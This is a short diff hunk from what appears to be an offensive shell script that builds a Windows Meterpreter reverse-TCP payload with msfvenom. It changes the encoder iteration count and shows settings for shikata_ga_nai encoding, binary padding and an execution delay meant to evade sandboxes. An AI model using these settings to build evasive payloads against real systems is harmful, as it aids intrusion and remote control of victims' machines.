@@ -216,7 +216,7 @@ echo -e $okegreen
 payload="windows/meterpreter/reverse_tcp"
 msfvenomBadChars="\x00\xff"
 msfvenomEncoder="x86/shikata_ga_nai"
-msfvenomIterations="4"  # Recommended value: 3
+msfvenomIterations="3"  # Recommended value: 3
 
 randomness=3517		# The higher the randomness the more padding is added to the c program increasing the binaries size
 delayRandomness=32676	# The higher the delay the longer it will take to execute the payload, may increase your chances of escaping a sandbox
